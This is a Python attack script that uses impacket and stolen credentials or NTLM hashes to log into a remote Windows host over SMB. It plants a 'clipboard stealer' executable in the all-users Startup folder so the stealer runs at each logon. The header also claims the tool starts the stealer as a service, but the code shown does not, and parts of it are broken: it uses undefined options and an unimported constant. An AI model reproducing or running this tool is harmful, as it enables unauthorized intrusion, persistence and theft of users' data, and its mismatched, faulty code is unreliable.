#!/usr/bin/env python3
#
# Aspyco
#
# V 1.0
#
# Copyright (C) 2022 Les tutos de Processus. All rights reserved.
#
#
# Description:
#   This tool permits to upload a local clipboard stealer through SMB on a remote host.
#   Then it remotely connects to svcctl named pipe through DCERPC to create
#   and start the stealer as a service.
#
# Author:
#   Processus (@ProcessusT)
#

import socket, sys, time
import os
import socket
import argparse
import logging
import traceback
from impacket.examples import logger
from impacket.examples.utils import parse_target
from impacket.smbconnection import SMBConnection
import random
import string
import requests



class inject_venom():
    def run(self, username, password, domain, lmhash, nthash, target, preferredDialect):
        try:
            # upload payload on c$ remote share
            print("Uploading stealer to remote host " + target + "...")
            letters = string.ascii_lowercase
            fake_computer_name = ''.join(random.choice(letters) for i in range(8))
            smbClient = SMBConnection(target, target, myName=fake_computer_name, preferredDialect=preferredDialect)
            smbClient.login(username, password, domain, lmhash, nthash)
            if smbClient.connectTree("c$") != 1:
                raise
            f = open("./svc-host.exe", "rb")
            smbClient.putFile("C$", "\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\svc-host.exe", f.read)
            print('File uploaded.')
        except Exception as e:
            print ("ERROR :")
            print(e)
            sys.exit()


   





def init_logger(args):
    logging.getLogger().setLevel(logging.INFO)
    logging.getLogger('impacket.smbserver').setLevel(logging.ERROR)


def main():
    parser = argparse.ArgumentParser(add_help=True, description="Upload and start your custom payloads remotely !")
    parser.add_argument('target', action='store', help='[[domain/]username[:password]@]<targetName or address>')
    parser.add_argument('-smb2', action='store', help='Force SMBv2')
    parser.add_argument('-hashes', action="store", metavar = "LMHASH:NTHASH", help='NTLM hashes, format is LMHASH:NTHASH')
    options = parser.parse_args()

    init_logger(options)

    domain, username, password, remoteName = parse_target(options.target)

    if domain is None:
        domain = ''

    if password == '' and username != '' and options.hashes is None and options.no_pass is False and options.aesKey is None:
        from getpass import getpass
        password = getpass("Password:")

    if options.hashes is not None:
        lmhash, nthash = options.hashes.split(':')
    else:
        lmhash = ''
        nthash = ''

   
    if options.smb2 is True:
        preferredDialect = SMB2_DIALECT_002
    else:
        preferredDialect = None

    c = inject_venom()
    dce = c.run(username=username, password=password, domain=domain, lmhash=lmhash, nthash=nthash, target=remoteName, preferredDialect=preferredDialect)
    sys.exit()

if __name__ == '__main__':
    main()